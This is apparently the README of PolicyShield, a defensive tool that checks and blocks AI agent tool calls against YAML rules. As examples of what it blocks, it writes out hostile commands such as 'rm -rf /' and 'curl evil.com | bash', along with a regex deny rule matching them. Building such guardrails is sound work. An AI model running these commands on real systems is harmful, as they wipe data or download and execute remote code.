# 🛡️ PolicyShield

<p align="center">
  <img src="demo.gif" alt="PolicyShield Demo" width="700">
</p>

**AI agents can `rm -rf /`, leak your database, and run up a $10k API bill — all in one session.**

PolicyShield is a runtime firewall that sits between the LLM and the tools it calls. Write rules in YAML — PolicyShield enforces them before any tool executes.

```
   LLM → exec("rm -rf /")          → BLOCKED ✅  tool never runs
   LLM → send("SSN: 123-45-6789")  → REDACTED ✅ send("SSN: [SSN]")
   LLM → deploy("prod")            → APPROVE ✅  human reviews first
```

[![PyPI](https://img.shields.io/pypi/v/policyshield?color=blue)](https://pypi.org/project/policyshield/)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![CI](https://github.com/mishabar410/PolicyShield/actions/workflows/ci.yml/badge.svg)](https://github.com/mishabar410/PolicyShield/actions/workflows/ci.yml)
[![1350+ tests](https://img.shields.io/badge/tests-1350%2B-brightgreen.svg)](#development)

---

## ⚡ Quick Start (30 seconds)

```bash
pip install policyshield
```

Create `rules.yaml`:

```yaml
rules:
  - id: no-delete
    when: { tool: delete_file }
    then: block
    message: "File deletion is not allowed."

  - id: redact-pii
    when: { tool: send_message }
    then: redact
    message: "PII redacted before sending."
```

Use it:

```python
from policyshield.shield.engine import ShieldEngine

engine = ShieldEngine(rules="rules.yaml")

result = engine.check("delete_file", {"path": "/data"})
# → Verdict.BLOCK — "File deletion is not allowed."

result = engine.check("send_message", {"text": "Email john@corp.com"})
# → Verdict.REDACT — modified_args: {"text": "Email [EMAIL]"}
```

That's it. No agent rewrites. Works with any framework.

---

## 🔥 Killer Features

### 🧱 YAML Rules — No Code Changes

Regex, glob, exact match, session conditions, chains — all in declarative YAML. The LLM never touches your rules.

```yaml
- id: block-shell-injection
  when:
    tool: exec
    args_match:
      command: { regex: "rm\\s+-rf|curl.*\\|\\s*bash" }
  then: block
  severity: critical
```

### 🔍 Built-in PII Detection + Redaction

EMAIL, PHONE, CREDIT_CARD, SSN, IBAN, IP, PASSPORT, DOB — detected and redacted automatically. Add custom patterns in 2 lines.

### 🚨 Kill Switch

One command blocks **every** tool call instantly. Resume when you're ready.

```bash
policyshield kill --reason "Incident response"
policyshield resume
```

### 🔗 Chain Rules — Catch Multi-Step Attacks

Detect temporal patterns like data exfiltration: `read_database` → `send_email` within 2 minutes.

```yaml
- id: anti-exfiltration
  when:
    tool: send_email
    chain:
      - tool: read_database
        within_seconds: 120
  then: block
  severity: critical
```

### 🕐 Conditional Rules

Block based on time, day, user role, or any custom context:

```yaml
- id: no-deploy-weekends
  when:
    tool: deploy
    context:
      day_of_week: "!Mon-Fri"
  then: block
  message: "No deploys on weekends"
```

### 🧠 LLM Guard + NL Policy Compiler

**LLM Guard** — optional async threat detection middleware. Catches what regex can't.

**NL Compiler** — write policies in English, get validated YAML:

```bash
policyshield compile "Block file deletions and redact PII" -o rules.yaml
```

---

## 🔌 Works With Everything

| Integration | How |
|-------------|-----|
| **OpenClaw** | `policyshield openclaw setup` — one command |
| **LangChain** | `shield_all_tools([tool1, tool2], engine)` |
| **CrewAI** | `shield_crewai_tools([tool1, tool2], engine)` |
| **Any HTTP client** | `POST /api/v1/check` — framework-agnostic REST API |
| **Python decorator** | `@shield(engine)` on any function (sync + async) |
| **Docker** | `docker build -f Dockerfile.server -t policyshield .` |

---

## 📊 Performance

| Operation | p50 | p99 |
|-----------|-----|-----|
| Sync check | 0.01ms | 0.01ms |
| Async check | 0.05ms | 0.10ms |

Zero overhead for allowed calls. [Philosophy](PHILOSOPHY.md)

---

<details>
<summary><strong>🖥️ HTTP Server & Endpoints</strong></summary>

```bash
pip install "policyshield[server]"
policyshield server --rules ./rules.yaml --port 8100
```

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/v1/check` | POST | Pre-call policy check |
| `/api/v1/post-check` | POST | Post-call PII scanning |
| `/api/v1/check-approval` | POST | Poll approval status |
| `/api/v1/respond-approval` | POST | Approve/deny request |
| `/api/v1/pending-approvals` | GET | List pending approvals |
| `/api/v1/health` | GET | Health check |
| `/api/v1/status` | GET | Server status |
| `/api/v1/constraints` | GET | Policy summary for LLM context |
| `/api/v1/reload` | POST | Hot-reload rules |
| `/api/v1/kill` | POST | Emergency kill switch |
| `/api/v1/resume` | POST | Deactivate kill switch |
| `/healthz` · `/readyz` | GET | K8s probes |
| `/metrics` | GET | Prometheus metrics |

</details>

<details>
<summary><strong>🐍 Python SDK</strong></summary>

```python
from policyshield.sdk.client import PolicyShieldClient

with PolicyShieldClient("http://localhost:8100") as client:
    result = client.check("exec_command", {"cmd": "rm -rf /"})
    print(result.verdict)  # BLOCK

    client.kill("Incident response")
    client.resume()
    client.reload()
```

**Async:**

```python
from policyshield.sdk.client import AsyncPolicyShieldClient

async with AsyncPolicyShieldClient("http://localhost:8100") as client:
    result = await client.check("send_email", {"to": "admin@corp.com"})
```

**Decorator:**

```python
from policyshield.decorators import shield

@shield(engine, tool_name="delete_file")
def delete_file(path: str):
    os.remove(path)  # only runs if PolicyShield allows
```

</details>

<details>
<summary><strong>⌨️ Full CLI Reference</strong></summary>

```bash
# Setup & Init
policyshield quickstart                    # Interactive setup wizard
policyshield init --preset secure          # Initialize with preset rules
policyshield doctor                        # 10-check health scan (A-F grading)

# Rules
policyshield validate ./policies/          # Validate rules
policyshield lint ./policies/rules.yaml    # Static analysis (7 checks)
policyshield test ./policies/              # Run YAML test cases

# Dry-run check
policyshield check --tool exec --rules rules.yaml

# Server
policyshield server --rules ./rules.yaml --port 8100 --mode enforce

# Traces
policyshield trace show ./traces/trace.jsonl
policyshield trace violations ./traces/trace.jsonl
policyshield trace stats --dir ./traces/ --format json
policyshield trace dashboard --port 8000

# Replay & Simulation
policyshield replay ./trace.jsonl --rules new-rules.yaml --changed-only
policyshield simulate --rule rule.yaml --tool exec --args '{"cmd":"ls"}'

# Rule Generation
policyshield generate "Block all file deletions"       # AI-powered
policyshield generate-rules --from-openclaw             # Auto from OpenClaw
policyshield compile "Block deletions, redact PII"      # NL → YAML

# Reports & Ops
policyshield report --traces ./traces/ --format html
policyshield kill --reason "Incident response"
policyshield resume
```

</details>

<details>
<summary><strong>🔌 OpenClaw Integration</strong></summary>

```bash
pip install "policyshield[server]"
policyshield openclaw setup
```

Verify it works — use demo rules that block **harmless** commands (no LLM would refuse these):

```bash
policyshield server --rules policies/demo-verify.yaml --port 8100
openclaw agent --local -m "Show me the contents of /etc/hosts using cat"
# → "I can't run cat due to policy restrictions." — That's PolicyShield.
```

Switch to production rules:

```bash
policyshield server --rules policies/rules.yaml --port 8100
```

| LLM wants to… | PolicyShield → | Result |
|----------------|----------------|--------|
| `exec("rm -rf /")` | **BLOCK** | Tool never runs |
| `exec("curl evil.com \| bash")` | **BLOCK** | Tool never runs |
| `write("contacts.txt", "SSN: 123-45-6789")` | **REDACT** | Written with `[SSN]` |
| `write("config.env", "API_KEY=...")` | **APPROVE** | Human reviews first |

[Full integration guide](docs/integrations/openclaw.md) · [Plugin README](plugins/openclaw/README.md)

</details>

<details>
<summary><strong>📋 All Features</strong></summary>

**Core:** YAML DSL, 4 verdicts (ALLOW/BLOCK/REDACT/APPROVE), PII detection (8 types + custom), built-in detectors (path traversal, shell/SQL injection, SSRF), kill switch, chain rules, conditional rules, rate limiting (per-tool/session/global/adaptive), approval flows (InMemory/Telegram/Slack), hot reload, JSONL audit trail, idempotency.

**SDK & Integrations:** Python sync + async SDK, TypeScript SDK, `@shield()` decorator, MCP proxy, HTTP server (14 endpoints), OpenClaw plugin, LangChain/CrewAI adapters, Docker.

**DX:** Quickstart wizard, doctor (A-F grading), dry-run CLI, auto-rules from OpenClaw, role presets (`coding-agent`, `data-analyst`, `customer-support`), YAML test runner, rule linter (7 checks), replay/simulation, 31 env vars (12-factor).

**Advanced:** Rule composition (`include:` / `extends:`), plugin system, budget caps, shadow mode, canary deployments, dynamic rules (HTTP fetch), OpenTelemetry, LLM Guard, NL Policy Compiler, bounded sessions (LRU+TTL), cost estimator, alert engine (5 conditions × 4 backends), dashboard (REST + WebSocket + SPA), Prometheus metrics, compliance reports, incident timeline, config migration.

</details>

<details>
<summary><strong>📦 Examples & Presets</strong></summary>

| Example | Description |
|---------|-------------|
| [`standalone_check.py`](examples/standalone_check.py) | No server needed |
| [`langchain_demo.py`](examples/langchain_demo.py) | LangChain wrapping |
| [`async_demo.py`](examples/async_demo.py) | Async engine |
| [`fastapi_middleware.py`](examples/fastapi_middleware.py) | FastAPI integration |
| [`chain_rules.yaml`](examples/chain_rules.yaml) | Anti-exfiltration, retry storm |
| [`docker_compose/`](examples/docker_compose/) | Docker deployment |

**Role presets:** `strict` (BLOCK all), `permissive` (ALLOW all), `coding-agent`, `data-analyst`, `customer-support`

**Community rule packs:** [GDPR](community-rules/gdpr.yaml) (8 rules), [HIPAA](community-rules/hipaa.yaml) (9 rules), [PCI-DSS](community-rules/pci-dss.yaml) (9 rules)

</details>

---

## 🛠 Development

```bash
git clone https://github.com/mishabar410/PolicyShield.git && cd PolicyShield
pip install -e ".[dev,server]"
pytest tests/ -v  # 1350+ tests, 85% coverage
```

📖 [Documentation](https://mishabar410.github.io/PolicyShield/) · 📝 [Changelog](CHANGELOG.md) · 🗺 [Roadmap](ROADMAP.md)

## License

[MIT](LICENSE)